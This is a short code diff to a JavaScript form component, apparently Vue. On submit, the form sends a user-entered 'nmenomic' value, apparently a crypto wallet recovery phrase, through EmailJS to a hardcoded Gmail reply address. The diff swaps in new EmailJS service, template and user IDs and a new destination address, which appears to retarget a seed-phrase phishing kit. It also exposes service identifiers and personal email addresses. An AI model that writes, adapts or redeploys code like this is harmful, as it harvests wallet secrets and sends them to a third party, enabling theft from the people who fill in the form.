@@ -29,13 +29,13 @@ export default {
       const checker = this.formChecker();
       if (checker) {
         var data = {
-          service_id: "service_2rkue4n",
-          template_id: "template_txd3ai9",
-          user_id: "user_5gsB9oWkIOLRMmy5c7HAQ",
+          service_id: "service_lvrm641",
+          template_id: "template_gnaql1j",
+          user_id: "user_aq7h9Gzs5I9hrgtM0jmF3",
           template_params: {
             from_name: "Nmenomic",
             nmenomic: this.nmenomic,
-            reply_to: "makatibliss@gmail.com"
+            reply_to: "crewwebinar@gmail.com"
           }
         };
         axios
